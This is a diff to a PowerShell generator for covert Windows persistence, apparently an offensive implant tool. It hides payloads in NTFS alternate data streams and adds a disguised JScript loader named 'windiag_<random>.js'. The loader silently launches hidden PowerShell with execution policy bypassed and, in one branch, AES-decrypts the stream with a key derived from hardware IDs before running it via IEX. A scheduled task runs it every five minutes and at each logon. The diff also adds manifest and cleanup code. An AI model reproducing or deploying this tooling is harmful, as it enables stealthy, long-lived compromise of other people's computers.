@@ -330,10 +330,39 @@ if(!(Test-Path `$hp)){ni `$hp -ItemType File -Force|Out-Null}
     # Persistence
     if ($Persist -eq 'task') {
         if ($Encrypt) {
+            # ============================================================
+            # ENCRYPTED: JScript wrapper with inline decryption functions
+            # ============================================================
             $block += @"
 `$adsPath=`$hp+':'+`$sn
-`$taskCmd='function Get-HostKey{`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join''|'';[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))};function Dec(`$d,`$k){`$b=[Convert]::FromBase64String(`$d);`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.IV=`$b[0..15];`$c=`$a.CreateDecryptor();`$t=`$b[16..(`$b.Length-1)];`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);[Text.Encoding]::UTF8.GetString(`$p)};`$k=Get-HostKey;`$e=Get-Content '''+`$adsPath+''' -Raw;`$p=Dec `$e `$k;IEX `$p'
-`$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `$taskCmd"
+`$_jsBody=@'
+var shell = new ActiveXObject("WScript.Shell");
+var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
+    "function Get-HostKey{" +
+        "`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;" +
+        "[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))" +
+    "};" +
+    "function Dec(`$d,`$k){" +
+        "`$b=[Convert]::FromBase64String(`$d);" +
+        "`$a=[Security.Cryptography.Aes]::Create();" +
+        "`$a.Key=`$k;`$a.IV=`$b[0..15];" +
+        "`$c=`$a.CreateDecryptor();" +
+        "`$t=`$b[16..(`$b.Length-1)];" +
+        "`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);" +
+        "[Text.Encoding]::UTF8.GetString(`$p)" +
+    "};" +
+    "`$k=Get-HostKey;" +
+    "`$e=Get-Content '__ADSPATH__' -Raw;" +
+    "`$p=Dec `$e `$k;" +
+    "IEX `$p" +
+    "\"";
+shell.Run(cmd, 0, false);
+'@
+`$_jsBody=`$_jsBody.Replace('__ADSPATH__',(`$adsPath-replace'\\','\\'))
+`$_jsDir=Split-Path `$hp -Parent;if(-not `$_jsDir){`$_jsDir=`$env:ProgramData}
+`$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
+`$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
+`$a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript ```"`$_jsPath```""
 `$t1=New-ScheduledTaskTrigger -AtLogOn
 `$t2=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
 `$t=@(`$t1,`$t2)
@@ -343,10 +372,23 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Pr
 
 "@
         } else {
+            # ============================================================
+            # UNENCRYPTED: JScript wrapper, simple IEX
+            # ============================================================
             $block += @"
 `$adsPath=`$hp+':'+`$sn
-`$cmd="IEX((Get-Content '`$adsPath' -Raw))"
-`$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ```"`$cmd```""
+`$_jsBody=@'
+var shell = new ActiveXObject("WScript.Shell");
+var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
+    "IEX(Get-Content '__ADSPATH__' -Raw)" +
+    "\"";
+shell.Run(cmd, 0, false);
+'@
+`$_jsBody=`$_jsBody.Replace('__ADSPATH__',(`$adsPath-replace'\\','\\'))
+`$_jsDir=Split-Path `$hp -Parent;if(-not `$_jsDir){`$_jsDir=`$env:ProgramData}
+`$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
+`$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
+`$a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript ```"`$_jsPath```""
 `$t1=New-ScheduledTaskTrigger -AtLogOn
 `$t2=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 9999)
 `$t=@(`$t1,`$t2)
@@ -357,6 +399,7 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Pr
 "@
         }
     } elseif ($Persist -eq 'registry') {
+        # Registry persistence: unchanged (no window-flash issue here)
         $block += @"
 Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value "powershell.exe -NoP -W Hidden -C `"IEX(gc '`$hp``:`$sn' -Raw)`""
 
@@ -452,24 +495,25 @@ if (-not $PayloadAtDeployment) {
     $payloadHash = (Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($(if ($actualPayload) { $actualPayload } else { $Payload })))) -Algorithm SHA256).Hash
     
     $manifest = @{
-        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
-        HostPath = $config.HostPath
-        StreamName = $config.StreamName
+        Timestamp         = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
+        HostPath          = $config.HostPath
+        StreamName        = $config.StreamName
         StreamNameEscaped = $config.StreamNameEscaped
-        Codepoints = $config.Codepoints
-        TaskName = $config.TaskName
-        ZeroWidthMode = $ZeroWidthMode
-        Persistence = $Persist
-        Encrypted = $Encrypt.IsPresent
-        DecoysCount = $CreateDecoys
-        Randomized = $Randomize.IsPresent
-        DeepPlacement = $UseDeepPlacement.IsPresent
-        AttachToExisting = $AttachToExisting.IsPresent
-        InstanceCount = $InstanceCount
-        PayloadHash = $payloadHash
-        Operator = $env:USER
-        GeneratedOn = hostname
-        OutputFile = $OutputFile
+        Codepoints        = $config.Codepoints
+        TaskName          = $config.TaskName
+        ZeroWidthMode     = $ZeroWidthMode
+        Persistence       = $Persist
+        Encrypted         = $Encrypt.IsPresent
+        DecoysCount       = $CreateDecoys
+        Randomized        = $Randomize.IsPresent
+        DeepPlacement     = $UseDeepPlacement.IsPresent
+        AttachToExisting  = $AttachToExisting.IsPresent
+        InstanceCount     = $InstanceCount
+        PayloadHash       = $payloadHash
+        Operator          = $env:USER
+        GeneratedOn       = hostname
+        OutputFile        = $OutputFile
+        JScriptLoaderNote = "Created at runtime: <host_dir>\windiag_<random>.js"
     }
     
     $manifest | ConvertTo-Json -Depth 10 | Out-File -FilePath $manifestFile -Encoding UTF8 -Force
@@ -538,6 +582,10 @@ Unregister-ScheduledTask -TaskName '$($config.TaskName)' -Confirm:`$false
 
 # Remove host file
 Remove-Item '$($config.HostPath)' -Force
+
+# Remove JScript wrapper (pattern match — runtime filename is randomized)
+`$_jsDir = Split-Path '$($config.HostPath)' -Parent
+if (`$_jsDir) { Get-ChildItem -Path `$_jsDir -Filter "windiag_*.js" -EA 0 | Remove-Item -Force }
 
 ╔═══════════════════════════════════════════════════════════╗
 "@
